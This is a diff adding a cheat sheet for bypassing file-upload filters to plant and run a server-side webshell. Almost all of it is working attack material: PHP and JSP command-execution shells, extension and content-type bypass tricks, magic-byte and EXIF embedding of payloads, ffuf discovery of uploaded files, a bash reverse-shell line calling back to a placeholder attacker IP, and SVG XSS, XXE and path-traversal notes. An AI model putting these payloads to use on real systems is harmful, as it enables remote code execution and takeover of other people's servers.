@@ -1,0 +1,30 @@
+FILE UPLOAD BYPASS — QUICK REF
+
+Requires: an upload feature; goal = land + execute a server-side webshell
+
+1.  Shell payload (match server tech):
+    PHP:  <?php system($_GET['c']); ?>
+    JSP:  <% Runtime.getRuntime().exec(request.getParameter("c")); %>
+    ASPX: msfvenom -f aspx
+
+2.  Extension bypass:
+    .phtml .php3 .php4 .php5 .php7 .pht .phar     (.phtml reliable on Apache)
+    case: shell.PhP  |  double: shell.php.jpg / shell.jpg.php
+    trailing: shell.php%00.jpg  shell.php.  shell.php%20
+    .htaccess trick: AddType application/x-httpd-php .jpg
+
+3.  Content-Type / magic bytes:
+    Content-Type: image/png        (filename stays shell.php)
+    GIF89a;<?php system($_GET['c']); ?>
+    exiftool -Comment='<?php system($_GET["c"]); ?>' img.jpg -o shell.php.jpg
+
+4.  Find + trigger:
+    ffuf -u http://<target>/uploads/FUZZ -w <wordlist>
+    http://<target>/uploads/shell.phtml?c=id
+    # rev shell (nc -lvnp 4444):
+    ?c=bash -c 'bash -i >%26 /dev/tcp/<your-ip>/4444 0>%261'
+
+5.  Non-RCE upload bugs:
+    SVG with <script> -> stored XSS
+    SVG/XML -> XXE (file read / SSRF)
+    ../ in filename -> path traversal write ; zip-slip ; overwrite config/.htaccess
